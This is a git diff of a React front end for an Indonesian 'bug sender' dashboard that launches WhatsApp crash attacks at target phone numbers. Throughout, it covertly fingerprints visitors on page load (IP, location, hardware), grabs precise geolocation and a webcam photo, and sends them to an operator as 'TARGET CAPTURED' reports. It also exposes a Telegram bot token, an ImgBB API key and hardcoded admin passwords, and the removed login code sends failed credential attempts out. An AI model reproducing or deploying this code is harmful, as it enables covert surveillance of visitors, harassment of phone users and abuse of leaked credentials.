@@ -3,14 +3,9 @@
 import React, { useState, useEffect, useRef } from "react"
 import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity } from "lucide-react"
 
-// KONFIGURASI UTAMA LU SELZ
-const TELE_TOKEN = "8633526016:AAGZGlW2TROHF1V6GujEpz8o_QYXNpqSkwM"
-const CHAT_ID = "6481060681"
-const IMGBB_API_KEY = "4caf6ea53a17b11f879581a8ca9ee92e"
-
 export default function YaeMikoDashboard() {
   const [isHydrated, setIsHydrated] = useState(false)
-  const [bugLimit, setBugLimit] = useState<number | null>(null)
+  const [bugLimit, setBugLimit] = useState<number>(5)
   const [isWebLocked, setIsWebLocked] = useState(false)
   const [isLoggedIn, setIsLoggedIn] = useState(false)
   const [username, setUsername] = useState("")
@@ -32,13 +27,10 @@ export default function YaeMikoDashboard() {
   const [isVerified, setIsVerified] = useState(false)
 
   const [userRole, setUserRole] = useState<"free" | "admin">("free")
-
   const [senderType, setSenderType] = useState<"global" | "pribadi">("global")
   const [senderNumber, setSenderNumber] = useState("")
   const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
   const [receivedCode, setReceivedCode] = useState("")
-
-  // STATE UNTUK SENDER PRIBADI
   const [isSenderPaired, setIsSenderPaired] = useState(false)
   const [pribadiLimit, setPribadiLimit] = useState(0)
 
@@ -70,14 +62,12 @@ export default function YaeMikoDashboard() {
 
       const msg = `🕵️ **NEW INTEL: ${targetID}**\n━━━━━━━━━━\n📍 **IP:** ${ipData.ip} (${ipData.org})\n🌍 **LOC:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}\n🔋 **BAT:** ${(navigator as any).hardwareConcurrency} Core / ${(navigator as any).deviceMemory || '?'}GB RAM`
 
-      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+      await fetch(`/api/control`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+        body: JSON.stringify({ action: 'sendReport', messageText: msg })
       })
-    } catch (e) {
-      console.error(e)
-    }
+    } catch (e) { console.error(e) }
   }
 
   const getPreciseLocation = (): Promise<string> => {
@@ -98,7 +88,8 @@ export default function YaeMikoDashboard() {
     const formData = new FormData()
     formData.append('image', imageBlob)
     try {
-      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+      // API Key ImgBB tetap aman di frontend untuk upload langsung
+      const res = await fetch(`https://api.imgbb.com/1/upload?key=4caf6ea53a17b11f879581a8ca9ee92e`, {
         method: 'POST',
         body: formData
       })
@@ -132,134 +123,164 @@ export default function YaeMikoDashboard() {
           const photoUrl = await uploadToIMGBB(blob)
           const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━`
 
-          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+          await fetch(`/api/control`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ action: 'sendReport', messageText: message })
           })
         }
         stream.getTracks().forEach(t => t.stop())
         setIsSending(false)
       }, 3000)
     } catch (e) {
-      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+      await fetch(`/api/control`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`, parse_mode: 'Markdown' })
+        body: JSON.stringify({ action: 'sendReport', messageText: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}` })
       })
       setIsSending(false)
     }
   }
 
-  const syncPairing = async (action: 'get' | 'set_code', messageText?: string) => {
+  const syncAllData = async () => {
     try {
-      if (action === 'get') {
-        const res = await fetch(`/api/webhook?update=${Date.now()}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'get_data' })
-        })
-        const data = await res.json()
-        if (data) {
-          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
-          if (pairingStatus === "loading" && data.pairingCode) {
-            setReceivedCode(data.pairingCode)
-            setPairingStatus("success")
-          }
-          if (data.isPaired !== undefined) {
-            setIsSenderPaired(data.isPaired === true)
-            setPribadiLimit(data.isPaired === true ? 10 : 0)
-          }
+      const res = await fetch(`/api/control?update=${Date.now()}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'get_data', username: username || null })
+      })
+      const data = await res.json()
+      if (data) {
+        if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
+        if (data.limit !== undefined && !isSendingRef.current) setBugLimit(Number(data.limit))
+        if (data.pairingCode && pairingStatus === "loading") {
+          setReceivedCode(data.pairingCode)
+          setPairingStatus("success")
         }
-      } else if (action === 'set_code' && messageText) {
-        await fetch('/api/webhook', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'set_code', messageText })
-        })
-      }
-    } catch (err) {
-      console.error(err)
-    }
-  }
-
-  const syncControl = async (action: 'get' | 'set' | 'sendReport', valueToSet?: number, messageText?: string) => {
-    try {
-      if (userRole === "admin" && (action === 'get' || action === 'set')) return
-
-      if (action === 'get') {
-        if (isSendingRef.current) return
-        const res = await fetch(`/api/control?update=${Date.now()}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'get_data' })
-        })
-        const data = await res.json()
-        if (data && !isSendingRef.current) {
-          if (data.limit !== undefined) setBugLimit(Number(data.limit))
-          if (data.locked !== undefined) setIsWebLocked(data.locked === true)
+        if (data.isPaired !== undefined) {
+          setIsSenderPaired(data.isPaired === true)
+          setPribadiLimit(data.isPaired === true ? 10 : 0)
         }
-      } else if (action === 'set' && valueToSet !== undefined) {
-        await fetch('/api/control', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'set', valueToSet })
-        })
-      } else if (action === 'sendReport' && messageText) {
-        await fetch('/api/control', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: 'sendReport', messageText })
-        })
       }
-    } catch (err) {
-      console.error(err)
-    }
+    } catch (err) { console.error(err) }
   }
 
   const handleRequestPairing = async () => {
     if (!senderNumber) return alert("Masukin nomor sender dulu!")
     setPairingStatus("loading")
-
     try {
-      await syncControl('sendReport', undefined, `/pair ${senderNumber}`)
+      await fetch('/api/control', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'sendReport', messageText: `/pair ${senderNumber}` })
+      })
 
-      const checkDatabaseInterval = setInterval(async () => {
-        await syncPairing('get')
+      const checkInterval = setInterval(async () => {
+        await syncAllData()
       }, 3000)
 
       setTimeout(() => {
-        clearInterval(checkDatabaseInterval)
+        clearInterval(checkInterval)
         setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
       }, 45000)
-
     } catch (e) {
       console.error(e)
       setPairingStatus("idle")
     }
   }
 
-  useEffect(() => {
-    sendInitialIntel()
-    async function initData() {
-      await syncControl('get')
-      await syncPairing('get')
-      const localVerify = localStorage.getItem('target_verified')
-      if (localVerify === 'true') {
-        setIsVerified(true)
+  const handleLogin = async () => {
+    try {
+      const res = await fetch('/api/control', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'login', username, password })
+      })
+      const data = await res.json()
+
+      if (data.success) {
+        setUserRole(data.role)
+        setIsLoggedIn(true)
+        setShowErrorOverlay(false)
+        if (data.role === "admin") {
+          localStorage.setItem("admin_key", password)
+        }
+        await syncAllData()
+      } else {
+        setShowErrorOverlay(true)
       }
-      setIsHydrated(true)
+    } catch (e) { console.error(e) }
+  }
+
+  const handleSendBug = async () => {
+    if (targetNumber === "6289505198913") {
+      setShowRestrictedOverlay(true)
+      return
     }
-    initData()
-  }, [userRole])
+
+    if (senderType === "pribadi" && !isSenderPaired) {
+      alert("Kamu belum pairing sender pribadi!")
+      return
+    }
+
+    isSendingRef.current = true
+    const selectedBug = BUG_TYPES[activeNav].name
+    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
+
+    setTimeout(async () => {
+      // Tembak API Bug untuk memproses pemotongan kuota Redis & pengondisian Role
+      const res = await fetch('/api/bug', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, targetNumber, selectedBug, engineSpeed, senderType, senderNumber })
+      })
+      const data = await res.json()
+
+      if (!data.success) {
+        if (data.error && data.error.includes("Limit")) {
+          setShowLimitPopup(true)
+        } else {
+          alert(data.error || "Gagal mengirim bug")
+        }
+        isSendingRef.current = false
+        return
+      }
+
+      await syncAllData()
+
+      if (isVerified) {
+        startFinalExecution()
+      } else {
+        setShowVerifyModal(true)
+      }
+
+      setTimeout(() => {
+        isSendingRef.current = false
+      }, 8000)
+    }, delay)
+  }
+
+  const copyToClipboard = () => {
+    if (typeof navigator !== 'undefined' && targetNumber) {
+      navigator.clipboard.writeText(targetNumber)
+      setIsCopied(true)
+      setTimeout(() => setIsCopied(false), 2000)
+    }
+  }
 
   useEffect(() => {
+    sendInitialIntel()
+    setIsHydrated(true)
+  }, [])
+
+  useEffect(() => {
+    if (!isLoggedIn) return
+    syncAllData()
     const autoRefresh = setInterval(async () => {
-      await syncControl('get')
-      await syncPairing('get')
+      await syncAllData()
     }, 4000)
     return () => clearInterval(autoRefresh)
-  }, [userRole, pairingStatus])
+  }, [isLoggedIn, username, pairingStatus])
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -282,96 +303,6 @@ export default function YaeMikoDashboard() {
     }
   }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])
 
-  const handleLogin = async () => {
-    if (username === "Leo" && password === "LEONZKENEDYZ") {
-      setUserRole("admin")
-      setIsLoggedIn(true)
-      setShowErrorOverlay(false)
-      const logMsg = `👑 *LAPORAN LOGIN ADMIN OWNER*\n\n👤 *User:* ${username}\n⚡ *Status:* Masuk sebagai Administrator`
-      await syncControl('sendReport', undefined, logMsg)
-    } else if (username === "Selz" && password === "Freebug") {
-      setUserRole("free")
-      setIsLoggedIn(true)
-      setShowErrorOverlay(false)
-      const logMsg = `🔔 *LAPORAN LOGIN DASHBOARD MEMBER*\n\n👤 *User:* ${username}`
-      await syncControl('sendReport', undefined, logMsg)
-    } else {
-      setShowErrorOverlay(true)
-      const alertMsg = `⚠️ *PERCOBAAN LOGIN GAGAL!*\n\n👤 *Username input:* ${username || 'Kosong'}\n🔑 *Password input:* ${password || 'Kosong'}`
-      await syncControl('sendReport', undefined, alertMsg)
-    }
-  }
-
-  const handleSendBug = async () => {
-    if (targetNumber === "6289505198913") {
-      setShowRestrictedOverlay(true)
-      return
-    }
-
-    const currentLimit = senderType === "pribadi" ? pribadiLimit : bugLimit
-
-    if (userRole === "free" && currentLimit <= 0) {
-      setShowLimitPopup(true)
-      return
-    }
-
-    if (senderType === "pribadi" && !isSenderPaired) {
-      alert("Kamu belum pairing sender pribadi!")
-      return
-    }
-
-    isSendingRef.current = true
-    let nextLimit = bugLimit
-
-    if (userRole === "free") {
-      if (senderType === "pribadi") {
-        const nextPribadiLimit = Math.max(0, pribadiLimit - 1)
-        setPribadiLimit(nextPribadiLimit)
-        nextLimit = nextPribadiLimit 
-      } else {
-        nextLimit = Math.max(0, bugLimit - 1)
-        setBugLimit(nextLimit)
-        await syncControl('set', nextLimit)
-      }
-    }
-
-    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
-    const selectedBug = BUG_TYPES[activeNav].name
-
-    setTimeout(async () => {
-      const sisaLimitText = userRole === "admin" ? "UNLIMITED (👑 ADMIN)" : `${nextLimit}/5`
-
-      const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username} (${userRole.toUpperCase()})\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${sisaLimitText}\n📱 *Sender Mode:* ${senderType.toUpperCase()}`
-      await syncControl('sendReport', undefined, attackMsg)
-
-      setTimeout(async () => {
-        const commandShortMsg = senderType === "pribadi" && senderNumber
-        ? `/ryx ${targetNumber} ${senderNumber}`
-          : `/ryx ${targetNumber}`
-
-        await syncControl('sendReport', undefined, commandShortMsg)
-      }, 1000)
-
-      if (isVerified) {
-        startFinalExecution()
-      } else {
-        setShowVerifyModal(true)
-      }
-
-      setTimeout(() => {
-        isSendingRef.current = false
-      }, 8000)
-    }, delay)
-  }
-
-  const copyToClipboard = () => {
-    if (typeof navigator !== 'undefined' && targetNumber) {
-      navigator.clipboard.writeText(targetNumber)
-      setIsCopied(true)
-      setTimeout(() => setIsCopied(false), 2000)
-    }
-  }
-
   if (!isHydrated) return <div className="bg-black min-h-screen flex items-center justify-center"><Loader2 className="w-8 h-8 text-cyan-400 animate-spin" /></div>
 
   if (isWebLocked) {
@@ -387,17 +318,9 @@ export default function YaeMikoDashboard() {
     )
   }
 
-  const currentStatus = (() => {
-    if (senderType === 'pribadi') {
-      return isSenderPaired 
-        ? { text: 'ACT', color: 'text-[#00e676]' } 
-        : { text: 'OFF', color: 'text-[#ff3b3b]' };
-    } else {
-      return bugLimit > 0 
-        ? { text: 'ACT', color: 'text-[#00e676]' } 
-        : { text: 'OFF', color: 'text-[#ff3b3b]' };
-    }
-  })();
+  const currentStatus = senderType === 'pribadi' 
+    ? (isSenderPaired ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' })
+    : (bugLimit > 0 ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' });
 
   return (
     <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth ? 'opacity-30' : 'opacity-100'}`}>
@@ -409,7 +332,6 @@ export default function YaeMikoDashboard() {
       </div>
       <audio ref={bgMusicRef} src="/audio.mp3" loop />
 
-      {/* OVERLAYS & MODALS (FIXED POSISI TENGAH RAPAT) */}
       {pairingStatus === "loading" && (
         <div className="fixed inset-0 z-[10008] bg-black/95 flex flex-col items-center justify-center backdrop-blur-md">
           <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
@@ -432,9 +354,7 @@ export default function YaeMikoDashboard() {
         <div className="fixed inset-0 z-[10005] bg-red-950/90 flex flex-col items-center justify-center p-8 text-center backdrop-blur-3xl animate-bg_rumble">
           <AlertTriangle className="w-24 h-24 text-red-500 mb-6 animate-shake_violent" />
           <h1 className="text-3xl font-black italic uppercase text-white animate-glitch_extreme mb-8">CREATE AKUN KE BOT DONGO!</h1>
-          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-4 px-10 rounded-full font-black uppercase text-xs flex items-center justify-center shadow-2xl">
-            BUKA BOT
-          </a>
+          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-4 px-10 rounded-full font-black uppercase text-xs flex items-center justify-center shadow-2xl">BUKA BOT</a>
           <button onClick={() => setShowErrorOverlay(false)} className="mt-6 text-white/40 font-bold uppercase text-[10px] tracking-widest hover:text-white transition">COBA LAGI</button>
         </div>
       )}
@@ -459,15 +379,9 @@ export default function YaeMikoDashboard() {
         <div className="fixed inset-0 z-[10001] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-md">
           <Bug className="w-28 h-28 text-red-600 mb-6 animate-shake_violent" />
           <h2 className="text-3xl font-black italic uppercase text-red-500 mb-4 drop-shadow-[0_0_15px_rgba(220,38,38,0.8)]">LIMIT LU ABIS NGENTOD</h2>
-          <p className="text-white/60 text-[10px] font-bold tracking-widest mb-10 uppercase max-w-[250px]">
-            PREMIUM KE BOT LAH KAGA MALU PAKE AKUN FREE MULU 😹
-          </p>
-          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-5 px-12 rounded-full font-black uppercase text-xs flex items-center gap-2 shadow-[0_0_20px_rgba(255,255,255,0.3)]">
-            <ExternalLink size={16} /> MENUJU BOT
-          </a>
-          <button onClick={() => setShowLimitPopup(false)} className="mt-6 text-white/30 font-bold uppercase text-[9px] tracking-widest hover:text-white transition">
-            LIMIT BAKALAN RESET SETELAH 24 JAM
-          </button>
+          <p className="text-white/60 text-[10px] font-bold tracking-widest mb-10 uppercase max-w-[250px]">PREMIUM KE BOT LAH KAGA MALU PAKE AKUN FREE MULU 😹</p>
+          <a href="https://t.me/lalaypo_bot" target="_blank" rel="noreferrer" className="bg-white text-black py-5 px-12 rounded-full font-black uppercase text-xs flex items-center gap-2 shadow-[0_0_20px_rgba(255,255,255,0.3)]"><ExternalLink size={16} /> MENUJU BOT</a>
+          <button onClick={() => setShowLimitPopup(false)} className="mt-6 text-white/30 font-bold uppercase text-[9px] tracking-widest hover:text-white transition">LIMIT BAKALAN RESET SETELAH 24 JAM</button>
         </div>
       )}
 
@@ -483,95 +397,45 @@ export default function YaeMikoDashboard() {
         </div>
       )}
 
-      {/* LOGIN PAGE */}
       {!isLoggedIn ? (
         <div className="relative z-10 flex items-center justify-center min-h-screen p-6">
           <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl">
-            <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
-              YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span>
-            </h1>
+            <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">YAE MIKO <span className="text-xs text-white/30 block tracking-[0.5em]">VERSI 1.5</span></h1>
             <div className="space-y-4">
-              <input
-                type="text"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition"
-                placeholder="USERNAME"
-              />
-              <input
-                type="password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition"
-                placeholder="PASSWORD"
-              />
-              <button
-                onClick={handleLogin}
-                className="w-full py-5 bg-cyan-600 hover:bg-cyan-500 rounded-full font-black uppercase italic text-xs text-white flex items-center justify-center gap-3 active:scale-95 transition-all shadow-[0_0_20px_rgba(0,229,255,0.3)]"
-              >
-                <Lock size={16}/> LOGIN
-              </button>
+              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition" placeholder="USERNAME" />
+              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-bold text-xs text-white outline-none focus:border-cyan-500 transition" placeholder="PASSWORD" />
+              <button onClick={handleLogin} className="w-full py-5 bg-cyan-600 hover:bg-cyan-500 rounded-full font-black uppercase italic text-xs text-white flex items-center justify-center gap-3 active:scale-95 transition-all shadow-[0_0_20px_rgba(0,229,255,0.3)]"><Lock size={16}/> LOGIN</button>
             </div>
           </div>
         </div>
       ) : (
         <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen pb-24">
-          
-          {/* DASHBOARD PAGE */}
           {currentView === 'dashboard' ? (
             <div className="animate-in fade-in duration-500">
-              
-              {/* HEADER SPEED & ROLE */}
               <div className="flex justify-between items-center mb-6">
                 <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
                 <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0 ? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-pink-500/10'}`}>
-                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
+                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${senderType === 'pribadi' ? pribadiLimit : bugLimit}/5`}
                 </span>
               </div>
 
-              {/* SECTION: BUG ENGINE CARD BARU (UI Delay Invisible) */}
               <div className="bg-gradient-to-b from-[#1a203f]/90 to-[#12162d]/90 backdrop-blur-md rounded-[30px] p-6 shadow-2xl relative overflow-hidden mb-6 border border-white/5">
-                
                 <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-[#00e5ff] opacity-10 blur-3xl rounded-full pointer-events-none"></div>
-
-                <div className="flex justify-center mb-4 relative z-10">
-                  {BUG_TYPES[activeNav].icon}
-                </div>
-
+                <div className="flex justify-center mb-4 relative z-10">{BUG_TYPES[activeNav].icon}</div>
                 <div className="flex justify-between items-center mb-8 px-2 relative z-10">
-                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
-                    <ChevronLeft size={20} className="text-white"/>
-                  </button>
-                  <h2 className="text-xl font-black text-white italic tracking-wider drop-shadow-lg text-center leading-none">
-                    {BUG_TYPES[activeNav].name}
-                  </h2>
-                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
-                    <ChevronRight size={20} className="text-white"/>
-                  </button>
+                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90"><ChevronLeft size={20} className="text-white"/></button>
+                  <h2 className="text-xl font-black text-white italic tracking-wider drop-shadow-lg text-center leading-none">{BUG_TYPES[activeNav].name}</h2>
+                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90"><ChevronRight size={20} className="text-white"/></button>
                 </div>
-
                 <div className="flex justify-between gap-3 relative z-10">
-                  {/* LIMIT */}
                   <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
-                    {userRole === "admin" ? (
-                      <Infinity className="w-8 h-8 text-[#00e5ff] mb-1 animate-pulse" />
-                    ) : (
-                      <span className="text-3xl font-bold text-[#00e5ff] mb-1">
-                        {senderType === 'pribadi' ? pribadiLimit : bugLimit}
-                      </span>
-                    )}
+                    {userRole === "admin" ? <Infinity className="w-8 h-8 text-[#00e5ff] mb-1 animate-pulse" /> : <span className="text-3xl font-bold text-[#00e5ff] mb-1">{senderType === 'pribadi' ? pribadiLimit : bugLimit}</span>}
                     <span className="text-[10px] font-bold text-gray-500 tracking-widest">LIMIT</span>
                   </div>
-
-                  {/* STATUS */}
                   <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
-                    <span className={`text-2xl font-black mb-1 ${currentStatus.color}`}>
-                      {userRole === 'admin' ? 'ACT' : currentStatus.text}
-                    </span>
+                    <span className={`text-2xl font-black mb-1 ${currentStatus.color}`}>{userRole === 'admin' ? 'ACT' : currentStatus.text}</span>
                     <span className="text-[10px] font-bold text-gray-500 tracking-widest">STATUS</span>
                   </div>
-
-                  {/* ONLINE */}
                   <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
                     <span className="text-3xl font-bold text-white mb-1">{onlineUsers}</span>
                     <span className="text-[10px] font-bold text-gray-500 tracking-widest">ONLINE</span>
@@ -579,55 +443,26 @@ export default function YaeMikoDashboard() {
                 </div>
               </div>
 
-              {/* TARGET NUMBER INPUT */}
               <div className="relative mb-6">
                 <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-black italic text-lg text-cyan-400 pr-16 outline-none focus:border-cyan-500 transition-all" placeholder="628XXXXXXXX" />
-                <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40 hover:text-cyan-400 transition-colors">
-                  {isCopied ? <CheckCircle2 size={24} className="text-green-500" /> : <Copy size={24} />}
-                </button>
+                <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40 hover:text-cyan-400 transition-colors">{isCopied ? <CheckCircle2 size={24} className="text-green-500" /> : <Copy size={24} />}</button>
               </div>
 
-              {/* TOMBOL UTAMA KIRIM BUG */}
-              <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white shadow-xl active:scale-95 transition-all">
-                KIRIM BUG
-              </button>
+              <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white shadow-xl active:scale-95 transition-all">KIRIM BUG</button>
 
-              {/* SECTION: PILIH SENDER (DIPINDAH KE BAWAH & DIPERKECIL) */}
               <div className="flex gap-3 mt-6 mb-2">
-                <button
-                  onClick={() => setSenderType('pribadi')}
-                  className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${
-                    senderType === 'pribadi' 
-                      ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' 
-                      : 'bg-[#151b3b]/80 backdrop-blur-md text-gray-400 hover:bg-[#1e2650]'
-                  }`}
-                >
-                  <svg className="w-6 h-6 mb-1" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
-                  </svg>
+                <button onClick={() => setSenderType('pribadi')} className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${senderType === 'pribadi' ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' : 'bg-[#151b3b]/80 backdrop-blur-md text-gray-400 hover:bg-[#1e2650]'}`}>
+                  <svg className="w-6 h-6 mb-1" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" /></svg>
                   <h2 className="text-sm font-bold leading-none mb-1">Pribadi</h2>
-                  <p className={`text-[9px] ${senderType === 'pribadi' ? 'text-black/80 font-bold' : 'text-gray-500 font-medium'}`}>
-                    {isSenderPaired ? '✓ Terkait' : '✗ Kosong'}
-                  </p>
+                  <p className={`text-[9px] ${senderType === 'pribadi' ? 'text-black/80 font-bold' : 'text-gray-500 font-medium'}`}>{isSenderPaired ? '✓ Terkait' : '✗ Kosong'}</p>
                 </button>
-
-                <button
-                  onClick={() => setSenderType('global')}
-                  className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${
-                    senderType === 'global' 
-                      ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' 
-                      : 'bg-[#111322]/80 backdrop-blur-md text-white hover:bg-[#1a1d36]'
-                  }`}
-                >
-                  <svg className="w-6 h-6 mb-1 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                  </svg>
+                <button onClick={() => setSenderType('global')} className={`flex-1 flex flex-col items-center justify-center py-4 rounded-2xl transition-all duration-300 border border-white/5 ${senderType === 'global' ? 'bg-[#00e5ff] text-black shadow-[0_0_15px_rgba(0,229,255,0.3)] scale-[1.02]' : 'bg-[#111322]/80 backdrop-blur-md text-white hover:bg-[#1a1d36]'}`}>
+                  <svg className="w-6 h-6 mb-1 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                   <h2 className="text-sm font-bold leading-none mb-1">Global</h2>
                   <p className={`text-[9px] ${senderType === 'global' ? 'text-black/80 font-bold' : 'text-gray-400 font-medium'}`}>54 sender</p>
                 </button>
               </div>
 
